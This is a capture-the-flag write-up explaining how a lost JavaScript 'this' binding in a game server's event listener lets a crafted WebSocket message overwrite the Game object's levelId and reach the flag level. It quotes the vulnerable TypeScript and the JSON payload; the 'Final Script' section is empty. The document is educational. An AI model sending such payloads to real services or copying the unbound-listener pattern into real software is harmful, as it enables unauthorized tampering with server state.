# Hey There!

This is a writeup of the solution to the "This then what huh?" CTF challenge. The challenge presents a web-based puzzle where the goal is to navigate a cursor through a series of instruction "blocks" to print a flag. The solution isn't in clever in-game logic, but is in exploiting a subtle vulnerability in Javascript's event handling.

### Part 1: Analyzing the Backend 

The first step was to understand the application's core. The source code is a Node.js backend using Express and WebSockets to manage a game. The game state, logic, and level design is all handled server-side in TypeScript.

**Key Files:**

*   `backend/game.ts`: This is the core of the app, containing the `Game` class. It controls the game loop (`step`), loads levels, tracks the cursor position, and uses an `EventEmitter` to emit game events.
*   `backend/blocks.ts`: This file defines the instruction blocks. Each block has a class with methods to define its behavior, specifically `attach` to subscribe to game events and `handleActiveBlock` to execute its logic when the cursor lands on it.
*   `backend/levels.ts`: This file contains the functions that construct the different levels by arranging instances of the block classes in a 2D array.

The vulnerability is born from the way `MoveRelativeBlock` interacts with the `Game` event system. To understand the vuln, we first need to look at a block that does things correctly, the `SlotBlock`.

`backend/blocks.ts` (from `SlotBlock`):
```typescript
// ...
this.messageListener = (message: object) => {
    if (message.type === "swap") {
        this.handleSwap(message, game);
    }
}
game.addListener("message", this.messageListener);
// ...
```
The `SlotBlock` uses an arrow function (`=>`) to define its event listener. In JavaScript, arrow functions preserve the `this` context, meaning that inside `messageListener`, `this` will always correctly refer to the `SlotBlock` instance.

Now, let's look at the vulnerable `MoveRelativeBlock`.

`backend/blocks.ts` (from `MoveRelativeBlock`):
```typescript
// ...
attach(game: Game): void {
    game.addListener(`activeBlock-${this.id}`, this.handleActiveBlock);
    game.addListener("message", this.handleMessage);
}
// ...
private handleMessage(message) {
    // ...
    this[axis] = value;
}
// ...
```
Unlike `SlotBlock`, `MoveRelativeBlock` passes its own `handleMessage` method directly as the event listener. This is the issue.

### Part 2: The Vulnerability 

In JavaScript, when you pass a function reference like `game.addListener("message", this.handleMessage)`, the function loses its original `this` context. When the `Game`'s `EventEmitter` later calls that function for a "message" event, it sets the `this` context to be itself.

Because of this, inside `MoveRelativeBlock.handleMessage`, the keyword `this` does not refer to the `MoveRelativeBlock` instance as intended, instead, it refers to the `Game` instance.

This leads to a powerful vulnerability. The line `this[axis] = value;` isn't modifying a property on the block; it's modifying a property directly on the main `Game` object. The relevant code is here:

`backend/blocks.ts` (in `MoveRelativeBlock`)
```typescript
private handleMessage(message) {
    if (message.type !== "move_relative_set") {
        return;
    }
    let {axis, value} = message;

    // This check is intended to protect the block's properties, but 'this' is the Game object.
    if (!["undefined", "number"].includes(typeof this[axis])) {
        return;
    }
    if (!(typeof value === "number")) {
        return;
    }
    value = Math.min(Math.max(value, -5), 5); // Clamps the value
    this[axis] = value; // Writes to the Game object
}
```
We can send a WebSocket message with `type: "move_relative_set"`, and we control `axis` (the property name) and `value`. We can overwrite any property on the `Game` object as long as its original type is `"number"` or `"undefined"`. Looking at the `Game` class, the `levelId` property is a perfect target.

### Part 3: Crafting the Exploit

The goal is to reach Level 3, which contains the `FlagBlock`.

`backend/levels.ts`:
```typescript
export function createLevel3(): Block[][] {
    return [
        [
            new PassBlock(),
            new PassBlock(),
            new PassBlock(),
            new FlagBlock()
        ]
    ]
}
```
The exploit path is now clear:

1.  **Solve Level 0:** The first level is a simple puzzle that requires swapping two blocks to reach the `NextLevelBlock`. This is done as intended.
2.  **Enter Level 1:** Upon entering Level 1, a `MoveRelativeBlock` is present on the board. Its `attach` method is called, and its vulnerable `handleMessage` function starts listening for messages, with its `this` context set to the `Game` instance.
3.  **Send the Payload:** We send a carefully crafted WebSocket message to exploit the vulnerability:
    ```json
    {
        "type": "move_relative_set",
        "axis": "levelId",
        "value": 3
    }
    ```
4.  **Hijack the Game Logic:** The server receives this message. The `handleMessage` function in `MoveRelativeBlock` executes. It interprets `this` as the `Game` object and obediently performs the assignment: `game.levelId = 3`.
5.  **Trigger a Level Load:** The game's cursor continues moving down the first column of Level 1 until it hits a `ResetBlock`. This block's function is to call `game.loadLevel(game.levelId)`. Because we just overwrote `levelId`, this call becomes `game.loadLevel(3)`.
6.  **Capture the Flag:** The server loads Level 3. The game loop automatically executes the sequence of `PassBlock`s, landing the cursor on the `FlagBlock`. The server then executes this block, sending the flag back over the WebSocket connection.

### Part 4: The Final Script

### Conclusion

The "This then what huh?" challenge was a brilliant demonstration of a often overlooked JavaScript pitfall. It highlights how critical it is to understand the language's core mechanics, like the behavior of `this` in different contexts.
